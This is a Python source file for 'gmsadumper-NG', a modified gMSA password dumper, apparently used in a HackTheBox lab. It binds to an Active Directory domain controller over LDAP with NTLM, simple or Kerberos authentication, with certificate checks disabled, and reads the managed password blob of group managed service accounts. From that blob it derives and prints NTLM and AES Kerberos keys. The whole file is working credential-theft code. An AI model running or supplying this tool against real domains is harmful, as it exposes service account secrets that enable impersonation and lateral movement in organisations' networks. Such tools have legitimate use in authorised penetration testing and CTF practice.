#!/usr/bin/env python3
# gmsadumper-NG
# Modified gMSADumper that tries multiple LDAP bind methods automatically.

r"""
Behavior:
  - If username/password provided, tries these binds in order:
      1) NTLM over LDAPS using NETBIOS\\username
      2) UPN SIMPLE over LDAPS using user@dns_domain
      3) NTLM with StartTLS (ldap:// + StartTLS) using NETBIOS\\username
      4) UPN SIMPLE with StartTLS using user@dns_domain
  - If -k is used, SASL/Kerberos path is preserved.
  - For lab convenience certificate validation is disabled. Change Tls(validate=...) for stricter checks.

Usage examples:
  python3 gMSADumper-NG.py -d rebound.htb -u TBRADY -p 'pass' -l dc01.rebound.htb
  python3 gMSADumper-NG.py -d rebound.htb -k
"""

from ldap3 import ALL, Server, Connection, NTLM, SASL, KERBEROS, extend, SUBTREE, SIMPLE, Tls
import argparse
from binascii import hexlify
from Cryptodome.Hash import MD4
from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
from impacket.structure import Structure
from impacket.krb5 import constants
from impacket.krb5.crypto import string_to_key
import sys
import ssl
from ldap3 import core

parser = argparse.ArgumentParser(description='Dump gMSA Passwords (gmsadumper-NG)')
parser.add_argument('-u','--username', help='username for LDAP', required=False)
parser.add_argument('-p','--password', help='password for LDAP (or LM:NT hash)', required=False)
parser.add_argument('-k','--kerberos', help='use kerberos authentication', required=False, action='store_true')
parser.add_argument('-l','--ldapserver', help='LDAP server (IP, FQDN or domain)', required=False)
parser.add_argument('-d','--domain', help='Domain (DNS or NetBIOS)', required=True)

class MSDS_MANAGEDPASSWORD_BLOB(Structure):
    structure = (
        ('Version','<H'),
        ('Reserved','<H'),
        ('Length','<L'),
        ('CurrentPasswordOffset','<H'),
        ('PreviousPasswordOffset','<H'),
        ('QueryPasswordIntervalOffset','<H'),
        ('UnchangedPasswordIntervalOffset','<H'),
        ('CurrentPassword',':'),
        ('PreviousPassword',':'),
        ('QueryPasswordInterval',':'),
        ('UnchangedPasswordInterval',':'),
    )

    def __init__(self, data=None):
        Structure.__init__(self, data=data)

    def fromString(self, data):
        Structure.fromString(self, data)

        if self['PreviousPasswordOffset'] == 0:
            endData = self['QueryPasswordIntervalOffset']
        else:
            endData = self['PreviousPasswordOffset']

        self['CurrentPassword'] = self.rawData[self['CurrentPasswordOffset']:][:endData - self['CurrentPasswordOffset']]
        if self['PreviousPasswordOffset'] != 0:
            self['PreviousPassword'] = self.rawData[self['PreviousPasswordOffset']:][:self['QueryPasswordIntervalOffset']-self['PreviousPasswordOffset']]

        self['QueryPasswordInterval'] = self.rawData[self['QueryPasswordIntervalOffset']:][:self['UnchangedPasswordIntervalOffset']-self['QueryPasswordIntervalOffset']]
        self['UnchangedPasswordInterval'] = self.rawData[self['UnchangedPasswordIntervalOffset']:]

def base_creator(domain):
    parts = domain.split(".")
    return ",".join([f"DC={p}" for p in parts]) if "." in domain else f"DC={domain}"

def derive_names(domain_str):
    """Return (dns_domain, netbios_domain) guesses from the provided -d."""
    if "." in domain_str:
        dns = domain_str
        netbios = domain_str.split(".")[0].upper()
    else:
        dns = domain_str  # may or may not be a real UPN suffix
        netbios = domain_str.upper()
    return dns, netbios

def try_bind_variants(host, dns_domain, netbios_domain, username, password):
    """
    Try bind variants in this order:
      1) NTLM over LDAPS (NETBIOS\\username)
      2) UPN SIMPLE over LDAPS (user@dns_domain)
      3) NTLM with StartTLS on ldap://
      4) UPN SIMPLE with StartTLS on ldap://
    Returns a bound Connection or raises LDAPBindError.
    """
    tls = Tls(validate=ssl.CERT_NONE)

    # 1) NTLM over LDAPS using NetBIOS style
    try:
        nb_user = f"{netbios_domain}\\{username}"
        s = Server(host, port=636, use_ssl=True, get_info=ALL, tls=tls)
        print(f"[+] trying NTLM over LDAPS as {nb_user}")
        c = Connection(s, user=nb_user, password=password, authentication=NTLM, auto_bind=True)
        if c.bound:
            print("[+] NTLM over LDAPS succeeded")
            return c
        c.unbind()
    except core.exceptions.LDAPBindError as e:
        print("    ntlm ldaps failed ->", e)
    except Exception as e:
        print("    unexpected error (ntlm ldaps) ->", repr(e))

    # 2) UPN SIMPLE over LDAPS
    try:
        upn = f"{username}@{dns_domain}"
        s = Server(host, port=636, use_ssl=True, get_info=ALL, tls=tls)
        print(f"[+] trying UPN SIMPLE over LDAPS as {upn}")
        c = Connection(s, user=upn, password=password, authentication=SIMPLE, auto_bind=True)
        if c.bound:
            print("[+] UPN SIMPLE over LDAPS succeeded")
            return c
        c.unbind()
    except core.exceptions.LDAPBindError as e:
        print("    upn ldaps failed ->", e)
    except Exception as e:
        print("    unexpected error (upn ldaps) ->", repr(e))

    # 3) NTLM with StartTLS
    try:
        nb_user = f"{netbios_domain}\\{username}"
        s = Server(host, port=389, use_ssl=False, get_info=ALL)
        print(f"[+] trying NTLM with StartTLS as {nb_user}")
        c = Connection(s, user=nb_user, password=password, authentication=NTLM, auto_bind=False)
        c.open()
        try:
            c.start_tls()
        except Exception as e:
            print("    start_tls failed ->", repr(e))
            c.unbind()
            raise
        c.bind()
        if c.bound:
            print("[+] NTLM with StartTLS succeeded")
            return c
        c.unbind()
    except core.exceptions.LDAPBindError as e:
        print("    ntlm starttls failed ->", e)
    except Exception as e:
        print("    unexpected error (ntlm starttls) ->", repr(e))

    # 4) UPN SIMPLE with StartTLS
    try:
        upn = f"{username}@{dns_domain}"
        s = Server(host, port=389, use_ssl=False, get_info=ALL)
        print(f"[+] trying UPN SIMPLE with StartTLS as {upn}")
        c = Connection(s, user=upn, password=password, authentication=SIMPLE, auto_bind=False)
        c.open()
        try:
            c.start_tls()
        except Exception as e:
            print("    start_tls failed ->", repr(e))
            c.unbind()
            raise
        c.bind()
        if c.bound:
            print("[+] UPN SIMPLE with StartTLS succeeded")
            return c
        c.unbind()
    except core.exceptions.LDAPBindError as e:
        print("    upn starttls failed ->", e)
    except Exception as e:
        print("    unexpected error (upn starttls) ->", repr(e))

    raise core.exceptions.LDAPBindError('No supported bind style succeeded')

def main():
    args = parser.parse_args()

    if args.kerberos and (args.username or args.password):
        print("-k and -u|-p options are mutually exclusive")
        sys.exit(-1)
    if args.password and not args.username:
        print("specify a username or use -k for kerberos authentication")
        sys.exit(-1)
    if args.username and not args.password:
        print("specify a password or use -k for kerberos authentication")
        sys.exit(-1)

    server_host = args.ldapserver if args.ldapserver else args.domain
    dns_domain, netbios_domain = derive_names(args.domain)

    server = Server(server_host, get_info=ALL)

    if not args.kerberos:
        try:
            conn = try_bind_variants(server_host, dns_domain, netbios_domain, args.username, args.password)
        except core.exceptions.LDAPBindError as e:
            print("LDAP bind attempts failed:", e)
            sys.exit(1)
        ldaps = True  # we force TLS for password attribute access
        try:
            if not getattr(conn.server, 'ssl', False):
                conn.start_tls()
                ldaps = True
        except Exception:
            pass
    else:
        try:
            conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
            try:
                conn.start_tls()
                ldaps = True
            except Exception:
                ldaps = False
        except Exception as e:
            print("Kerberos bind failed ->", repr(e))
            sys.exit(1)

    if conn is None or not getattr(conn, 'bound', False):
        print("Failed to obtain a bound LDAP connection.")
        sys.exit(1)

    if ldaps:
        try:
            success = conn.search(base_creator(dns_domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))',
                                  search_scope=SUBTREE,
                                  attributes=['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership'])
        except Exception as e:
            print("LDAP search failed on LDAPS path ->", repr(e))
            success = False
    else:
        try:
            success = conn.search(base_creator(dns_domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))',
                                  search_scope=SUBTREE,
                                  attributes=['sAMAccountName','msDS-GroupMSAMembership'])
        except Exception as e:
            print("LDAP search failed on non-LDAPS path ->", repr(e))
            success = False

    if success:
        if len(conn.entries) == 0:
            print('No gMSAs returned.')
        for entry in conn.entries:
            sam = entry['sAMAccountName'].value
            print('Users or groups who can read password for ' + sam + ':')
            if 'msDS-GroupMSAMembership' in entry and entry['msDS-GroupMSAMembership']:
                try:
                    raw = entry['msDS-GroupMSAMembership'].raw_values[0]
                    for dacl in SR_SECURITY_DESCRIPTOR(data=raw)['Dacl']['Data']:
                        conn.search(base_creator(dns_domain),
                                    '(&(objectSID=' + dacl['Ace']['Sid'].formatCanonical() + '))',
                                    attributes=['sAMAccountName'])
                        if len(conn.entries) != 0:
                            print(' > ' + conn.entries[0]['sAMAccountName'].value)
                except Exception as e:
                    print("    failed to parse msDS-GroupMSAMembership ->", repr(e))
            else:
                print("    no msDS-GroupMSAMembership attribute present or it is empty")

            if 'msDS-ManagedPassword' in entry and entry['msDS-ManagedPassword']:
                try:
                    data = entry['msDS-ManagedPassword'].raw_values[0]
                    blob = MSDS_MANAGEDPASSWORD_BLOB()
                    blob.fromString(data)
                    currentPassword = blob['CurrentPassword'][:-2]

                    # NTLM
                    ntlm_hash = MD4.new()
                    ntlm_hash.update(currentPassword)
                    passwd = hexlify(ntlm_hash.digest()).decode("utf-8")
                    print(sam + ':::' + passwd)

                    # AES
                    pw_utf8 = currentPassword.decode('utf-16-le', 'replace').encode('utf-8')
                    salt = '%shost%s.%s' % (dns_domain.upper(), sam[:-1].lower(), dns_domain.lower())
                    aes_128_hash = hexlify(string_to_key(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, pw_utf8, salt).contents)
                    aes_256_hash = hexlify(string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, pw_utf8, salt).contents)
                    print('%s:aes256-cts-hmac-sha1-96:%s' % (sam, aes_256_hash.decode('utf-8')))
                    print('%s:aes128-cts-hmac-sha1-96:%s' % (sam, aes_128_hash.decode('utf-8')))
                except Exception as e:
                    print("    failed to parse msDS-ManagedPassword blob ->", repr(e))
    else:
        print('LDAP query failed.')
        print(success)

if __name__ == "__main__":
    main()
